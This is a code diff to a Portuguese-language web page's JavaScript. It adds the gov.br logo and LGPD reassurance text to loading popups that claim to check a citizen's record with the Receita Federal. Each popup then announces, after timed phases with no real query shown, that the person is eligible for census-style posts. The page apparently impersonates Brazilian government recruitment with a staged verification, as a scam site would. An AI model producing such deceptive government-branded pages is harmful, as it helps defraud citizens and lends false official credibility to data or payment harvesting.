@@ -552,18 +552,25 @@ function showAgenteLoadingPopup() {
         existingPopup.remove();
     }
     
-    // Criar popup de loading SEPARADO para agente - visualmente idêntico mas funcionalmente independente
+    // Criar popup de loading SEPARADO para agente - COM LOGO GOV.BR idêntico ao supervisor
     const loadingPopup = document.createElement('div');
     loadingPopup.id = 'agente-loading-popup';
     loadingPopup.className = 'fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50';
     loadingPopup.innerHTML = `
         <div class="bg-white rounded-lg p-8 max-w-md mx-4 text-center">
-            <div class="mb-6">
-                <div class="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto"></div>
+            <img src="https://barra.sistema.gov.br/v1/assets/govbr.webp" alt="gov.br" class="h-12 mx-auto mb-6">
+            
+            <div class="flex justify-center mb-4">
+                <div class="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600"></div>
             </div>
-            <div id="agente-loading-message" class="text-gray-600 mb-4">
-                <p>Consultando se o cidadão possui pendências com a Receita Federal...</p>
+            
+            <div id="agente-loading-message" class="text-gray-800 font-medium mb-4">
+                Consultando se o cidadão possui pendências com a Receita Federal...
             </div>
+            
+            <p class="text-xs text-gray-600 leading-relaxed">
+                Criando ambiente seguro e protegendo dados de acordo com a lei LGPD.
+            </p>
         </div>
     `;
     
@@ -575,7 +582,8 @@ function showAgenteLoadingPopup() {
         console.log('PRIMEIRA FASE AGENTE EXECUTADA!');
         const messageElement = document.getElementById('agente-loading-message');
         if (messageElement) {
-            messageElement.innerHTML = `<p class="text-green-600">Cidadão apto para o cargo de Agente de Pesquisas e Mapeamento</p>`;
+            messageElement.innerHTML = `Cidadão apto para o cargo de Agente de Pesquisas e Mapeamento`;
+            messageElement.className = 'text-green-600 font-medium mb-4';
         }
         
         // Segunda fase: Confirmação de aptidão (3.5 segundos)
@@ -648,18 +656,25 @@ function showSupervisorLoadingPopup() {
         existingPopup.remove();
     }
     
-    // Criar popup de loading SEPARADO para supervisor - visualmente idêntico mas funcionalmente independente
+    // Criar popup de loading SEPARADO para supervisor - COM LOGO GOV.BR idêntico ao agente
     const loadingPopup = document.createElement('div');
     loadingPopup.id = 'supervisor-loading-popup';
     loadingPopup.className = 'fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50';
     loadingPopup.innerHTML = `
         <div class="bg-white rounded-lg p-8 max-w-md mx-4 text-center">
-            <div class="mb-6">
-                <div class="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto"></div>
+            <img src="https://barra.sistema.gov.br/v1/assets/govbr.webp" alt="gov.br" class="h-12 mx-auto mb-6">
+            
+            <div class="flex justify-center mb-4">
+                <div class="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600"></div>
             </div>
-            <div id="supervisor-loading-message" class="text-gray-600 mb-4">
-                <p>Consultando se o cidadão possui pendências com a Receita Federal...</p>
+            
+            <div id="supervisor-loading-message" class="text-gray-800 font-medium mb-4">
+                Consultando se o cidadão possui pendências com a Receita Federal...
             </div>
+            
+            <p class="text-xs text-gray-600 leading-relaxed">
+                Criando ambiente seguro e protegendo dados de acordo com a lei LGPD.
+            </p>
         </div>
     `;
     
@@ -671,7 +686,8 @@ function showSupervisorLoadingPopup() {
         console.log('PRIMEIRA FASE SUPERVISOR EXECUTADA!');
         const messageElement = document.getElementById('supervisor-loading-message');
         if (messageElement) {
-            messageElement.innerHTML = `<p class="text-green-600">Cidadão apto para o cargo de Supervisor de Coleta e Qualidade</p>`;
+            messageElement.innerHTML = `Cidadão apto para o cargo de Supervisor de Coleta e Qualidade`;
+            messageElement.className = 'text-green-600 font-medium mb-4';
         }
         
         // Segunda fase: Confirmação de aptidão (3.5 segundos)
